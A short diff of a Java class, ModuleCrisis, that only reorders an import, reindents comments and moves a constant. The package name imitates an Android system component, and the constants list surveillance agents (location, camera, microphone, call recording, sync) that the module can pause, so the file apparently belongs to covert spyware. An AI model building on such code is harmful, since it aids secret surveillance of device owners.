@@ -9,29 +9,29 @@
 
 package com.android.syssetup.module;
 
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.conf.ConfModule;
 import com.android.syssetup.conf.ConfigurationException;
 import com.android.syssetup.evidence.EvidenceBuilder;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
 
 
 public class ModuleCrisis extends BaseModule {
-	private static final String TAG = "ModuleCrisis"; //$NON-NLS-1$
 	//$NON-NLS-1$
 	public static final int NONE = 0x0; // Per retrocompatibilita'
 	public static final int POSITION = 0x1; // Inibisci il GPS/GSM/WiFi Location
-											// Agent
+	// Agent
 	public static final int CAMERA = 0x2; // Inibisci il Camera Agent
 	public static final int MIC = 0x3; // Inibisci la registrazione del
-										// microfono
+	// microfono
 	public static final int CALL = 0x4; // Inibisci l'agente di registrazione
-										// delle chiamate
+	// delle chiamate
 	public static final int SYNC = 0x5; // Inibisci tutte le routine di
-										// sincronizzazione
+	// sincronizzazione
 	public static final int SIZE = 0x6;
+	private static final String TAG = "ModuleCrisis"; //$NON-NLS-1$
 
 	// private int type;
 
